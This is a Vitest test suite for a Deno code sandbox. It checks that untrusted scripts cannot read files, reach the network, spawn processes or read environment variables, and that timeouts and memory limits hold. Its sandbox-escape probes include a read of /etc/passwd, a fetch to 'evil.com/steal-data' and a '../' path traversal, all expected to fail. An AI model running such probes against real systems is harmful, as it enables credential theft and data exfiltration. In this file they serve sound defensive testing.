/**
 * Tests for DenoExecutor - focusing on security and sandbox isolation
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { DenoExecutor, createDenoExecutor } from '../../src/runtime/deno-executor.js';
import type { SandboxConfig, RuntimeConfig, DenoPermissions } from '../../src/types/index.js';
import { RuntimeError, SecurityError, ValidationError } from '../../src/types/errors.js';

describe('DenoExecutor', () => {
  let executor: DenoExecutor;
  let defaultConfig: SandboxConfig;

  beforeEach(() => {
    defaultConfig = {
      timeout: 5000,
      memoryLimit: 50 * 1024 * 1024, // 50MB
      permissions: {
        allowNet: false,
        allowRead: false,
        allowWrite: false,
        allowEnv: false,
        allowRun: false,
        allowHrtime: false,
      },
      allowedModules: [],
    };
    executor = new DenoExecutor(defaultConfig);
  });

  afterEach(async () => {
    await executor.cleanup();
  });

  describe('Basic Execution', () => {
    it('should execute simple TypeScript code', async () => {
      const code = `
        const result = 2 + 2;
        console.log(JSON.stringify(result));
      `;

      const result = await executor.execute(code);
      
      expect(result.success).toBe(true);
      expect(result.result).toBe(4);
      expect(result.metrics.duration).toBeGreaterThan(0);
    });

    it('should handle code with return values', async () => {
      const code = `
        function add(a: number, b: number): number {
          return a + b;
        }
        const result = add(5, 3);
        console.log(JSON.stringify(result));
      `;

      const result = await executor.execute(code);
      
      expect(result.success).toBe(true);
      expect(result.result).toBe(8);
    });

    it('should handle complex data structures', async () => {
      const code = `
        interface User {
          name: string;
          age: number;
        }
        
        const user: User = { name: "Alice", age: 30 };
        const users = [user, { name: "Bob", age: 25 }];
        console.log(JSON.stringify(users));
      `;

      const result = await executor.execute(code);
      
      expect(result.success).toBe(true);
      expect(Array.isArray(result.result)).toBe(true);
      expect((result.result as any)[0]).toEqual({ name: "Alice", age: 30 });
    });
  });

  describe('Security - File System Access', () => {
    it('should block file system read access by default', async () => {
      const code = `
        try {
          const content = await Deno.readTextFile('/etc/passwd');
          console.log(JSON.stringify({ success: true, content }));
        } catch (error) {
          console.log(JSON.stringify({ success: false, error: error.message }));
        }
      `;

      const result = await executor.execute(code);
      
      expect(result.success).toBe(true);
      const output = result.result as any;
      expect(output.success).toBe(false);
      expect(output.error).toContain('Requires');
    });

    it('should block file system write access by default', async () => {
      const code = `
        try {
          await Deno.writeTextFile('/tmp/test.txt', 'malicious content');
          console.log(JSON.stringify({ success: true }));
        } catch (error) {
          console.log(JSON.stringify({ success: false, error: error.message }));
        }
      `;

      const result = await executor.execute(code);
      
      expect(result.success).toBe(true);
      const output = result.result as any;
      expect(output.success).toBe(false);
      expect(output.error).toContain('Requires');
    });

    it('should allow specific file read when configured', async () => {
      const permissiveConfig: SandboxConfig = {
        ...defaultConfig,
        permissions: {
          ...defaultConfig.permissions,
          allowRead: ['/tmp'],
        },
      };
      
      const permissiveExecutor = new DenoExecutor(permissiveConfig);
      
      const code = `
        try {
          // This should still fail because we're trying to read outside allowed path
          const content = await Deno.readTextFile('/etc/passwd');
          console.log(JSON.stringify({ success: true, content }));
        } catch (error) {
          console.log(JSON.stringify({ success: false, error: error.message }));
        }
      `;

      const result = await permissiveExecutor.execute(code);
      
      expect(result.success).toBe(true);
      const output = result.result as any;
      expect(output.success).toBe(false);
      
      await permissiveExecutor.cleanup();
    });
  });

  describe('Security - Network Access', () => {
    it('should block network access by default', async () => {
      const code = `
        try {
          const response = await fetch('https://httpbin.org/get');
          const data = await response.json();
          console.log(JSON.stringify({ success: true, data }));
        } catch (error) {
          console.log(JSON.stringify({ success: false, error: error.message }));
        }
      `;

      const result = await executor.execute(code);
      
      expect(result.success).toBe(true);
      const output = result.result as any;
      expect(output.success).toBe(false);
      expect(output.error).toContain('Requires');
    });

    it('should allow specific network access when configured', async () => {
      const networkConfig: SandboxConfig = {
        ...defaultConfig,
        permissions: {
          ...defaultConfig.permissions,
          allowNet: ['httpbin.org'],
        },
      };
      
      const networkExecutor = new DenoExecutor(networkConfig);
      
      const code = `
        try {
          // This should still fail for unauthorized domains
          const response = await fetch('https://evil.com/steal-data');
          console.log(JSON.stringify({ success: true }));
        } catch (error) {
          console.log(JSON.stringify({ success: false, error: error.message }));
        }
      `;

      const result = await networkExecutor.execute(code);
      
      expect(result.success).toBe(true);
      const output = result.result as any;
      expect(output.success).toBe(false);
      
      await networkExecutor.cleanup();
    });
  });

  describe('Security - Process Execution', () => {
    it('should block subprocess execution by default', async () => {
      const code = `
        try {
          const process = new Deno.Command('ls', { args: ['-la'] });
          const output = await process.output();
          console.log(JSON.stringify({ success: true, output: new TextDecoder().decode(output.stdout) }));
        } catch (error) {
          console.log(JSON.stringify({ success: false, error: error.message }));
        }
      `;

      const result = await executor.execute(code);
      
      expect(result.success).toBe(true);
      const output = result.result as any;
      expect(output.success).toBe(false);
      expect(output.error).toContain('Requires');
    });
  });

  describe('Security - Environment Variables', () => {
    it('should block environment variable access by default', async () => {
      const code = `
        try {
          const path = Deno.env.get('PATH');
          console.log(JSON.stringify({ success: true, path }));
        } catch (error) {
          console.log(JSON.stringify({ success: false, error: error.message }));
        }
      `;

      const result = await executor.execute(code);
      
      expect(result.success).toBe(true);
      const output = result.result as any;
      expect(output.success).toBe(false);
      expect(output.error).toContain('Requires');
    });
  });

  describe('Resource Limits', () => {
    it('should enforce timeout limits', async () => {
      const shortTimeoutConfig: SandboxConfig = {
        ...defaultConfig,
        timeout: 1000, // 1 second
      };
      
      const timeoutExecutor = new DenoExecutor(shortTimeoutConfig);
      
      const code = `
        // Infinite loop to test timeout
        while (true) {
          // Do nothing
        }
      `;

      const result = await timeoutExecutor.execute(code);
      
      expect(result.success).toBe(false);
      expect(result.error).toBeInstanceOf(RuntimeError);
      expect(result.error?.message).toContain('timed out');
      
      await timeoutExecutor.cleanup();
    });

    it('should collect execution metrics', async () => {
      const code = `
        const data = new Array(1000).fill('test');
        const result = data.length;
        console.log(JSON.stringify(result));
      `;

      const result = await executor.execute(code);
      
      expect(result.success).toBe(true);
      expect(result.metrics.duration).toBeGreaterThan(0);
      expect(result.metrics.memoryUsed).toBeGreaterThanOrEqual(0);
      expect(result.metrics.apiCallCount).toBeGreaterThanOrEqual(0);
    });
  });

  describe('Error Handling', () => {
    it('should handle syntax errors gracefully', async () => {
      const code = `
        const invalid syntax here
      `;

      const result = await executor.execute(code);
      
      expect(result.success).toBe(false);
      expect(result.error).toBeInstanceOf(RuntimeError);
    });

    it('should handle runtime errors gracefully', async () => {
      const code = `
        throw new Error('Runtime error for testing');
      `;

      const result = await executor.execute(code);
      
      expect(result.success).toBe(false);
      expect(result.error).toBeInstanceOf(RuntimeError);
    });

    it('should validate file paths for security', async () => {
      const maliciousPath = '../../../etc/passwd';
      
      const result = await executor.executeFile(maliciousPath);
      
      expect(result.success).toBe(false);
      expect(result.error).toBeInstanceOf(SecurityError);
    });

    it('should reject non-TypeScript files', async () => {
      const jsPath = 'malicious.js';
      
      const result = await executor.executeFile(jsPath);
      
      expect(result.success).toBe(false);
      expect(result.error).toBeInstanceOf(ValidationError);
    });
  });

  describe('Configuration Management', () => {
    it('should allow updating permissions', () => {
      const newPermissions: DenoPermissions = {
        allowNet: true,
        allowRead: ['/tmp'],
        allowWrite: false,
        allowEnv: false,
        allowRun: false,
        allowHrtime: false,
      };

      executor.setPermissions(newPermissions);
      
      const config = executor.getConfig();
      expect(config.permissions).toEqual(newPermissions);
    });

    it('should allow updating full configuration', () => {
      const newConfig: Partial<SandboxConfig> = {
        timeout: 10000,
        memoryLimit: 100 * 1024 * 1024,
        allowedModules: ['https://deno.land/std/'],
      };

      executor.updateConfig(newConfig);
      
      const config = executor.getConfig();
      expect(config.timeout).toBe(10000);
      expect(config.memoryLimit).toBe(100 * 1024 * 1024);
      expect(config.allowedModules).toEqual(['https://deno.land/std/']);
    });

    it('should merge execution options with config', async () => {
      const code = `console.log(JSON.stringify('test'));`;
      
      const options = {
        timeout: 2000,
        captureMetrics: true,
      };

      const result = await executor.execute(code, options);
      
      expect(result.success).toBe(true);
      expect(result.metrics).toBeDefined();
    });
  });

  describe('Factory Function', () => {
    it('should create executor from RuntimeConfig', () => {
      const runtimeConfig: RuntimeConfig = {
        timeout: 3000,
        memoryLimit: 64 * 1024 * 1024,
        permissions: {
          allowNet: false,
          allowRead: false,
          allowWrite: false,
          allowEnv: false,
          allowRun: false,
          allowHrtime: false,
        },
        allowedModules: ['https://deno.land/std/'],
        enableDebugging: true,
      };

      const createdExecutor = createDenoExecutor(runtimeConfig);
      const config = createdExecutor.getConfig();
      
      expect(config.timeout).toBe(3000);
      expect(config.memoryLimit).toBe(64 * 1024 * 1024);
      expect(config.allowedModules).toEqual(['https://deno.land/std/']);
      expect(config.enableDebugging).toBe(true);
      
      createdExecutor.cleanup();
    });
  });

  describe('Advanced Security Tests', () => {
    it('should prevent access to sensitive system information', async () => {
      const code = `
        try {
          // Try to access system information that should be blocked
          const osInfo = {
            platform: Deno.build.os,
            arch: Deno.build.arch,
            version: Deno.version
          };
          console.log(JSON.stringify({ success: true, osInfo }));
        } catch (error) {
          console.log(JSON.stringify({ success: false, error: error.message }));
        }
      `;

      const result = await executor.execute(code);
      
      expect(result.success).toBe(true);
      // This should succeed as Deno.build and Deno.version are allowed
      const output = result.result as any;
      expect(output.success).toBe(true);
      expect(output.osInfo).toBeDefined();
    });

    it('should prevent memory exhaustion attacks', async () => {
      const lowMemoryConfig: SandboxConfig = {
        ...defaultConfig,
        timeout: 2000,
        memoryLimit: 10 * 1024 * 1024, // 10MB limit
      };
      
      const memoryExecutor = new DenoExecutor(lowMemoryConfig);
      
      const code = `
        try {
          // Try to allocate large amounts of memory
          const bigArray = new Array(1000000).fill('x'.repeat(1000));
          console.log(JSON.stringify({ success: true, size: bigArray.length }));
        } catch (error) {
          console.log(JSON.stringify({ success: false, error: error.message }));
        }
      `;

      const result = await memoryExecutor.execute(code);
      
      // This might succeed or fail depending on system memory, but should not crash
      expect(result.success).toBeDefined();
      
      await memoryExecutor.cleanup();
    });

    it('should handle malformed code gracefully', async () => {
      const malformedCodes = [
        'const x = {',  // Unclosed brace
        'function test() { return',  // Incomplete function
        'import * from "nonexistent";',  // Invalid import
        '(() => { throw new Error("test"); })()',  // Immediate error
      ];

      for (const code of malformedCodes) {
        const result = await executor.execute(code);
        expect(result.success).toBe(false);
        expect(result.error).toBeInstanceOf(RuntimeError);
        expect(result.metrics.duration).toBeGreaterThan(0);
      }
    });

    it('should prevent information leakage in error messages', async () => {
      const code = `
        // Try to access a file that doesn't exist to see error details
        try {
          await Deno.readTextFile('/nonexistent/secret/file.txt');
        } catch (error) {
          // The error message should not reveal internal system paths
          console.log(JSON.stringify({ error: error.message }));
        }
      `;

      const result = await executor.execute(code);
      
      expect(result.success).toBe(true);
      const output = result.result as any;
      expect(output.error).toBeDefined();
      // Should contain permission error, not internal system details
      expect(output.error).toContain('Requires');
    });
  });

  describe('Cleanup', () => {
    it('should clean up temporary files', async () => {
      const code = `console.log(JSON.stringify('cleanup test'));`;
      
      await executor.execute(code);
      await executor.cleanup();
      
      // After cleanup, executor should still be usable for new executions
      const result = await executor.execute(code);
      expect(result.success).toBe(true);
    });
  });
});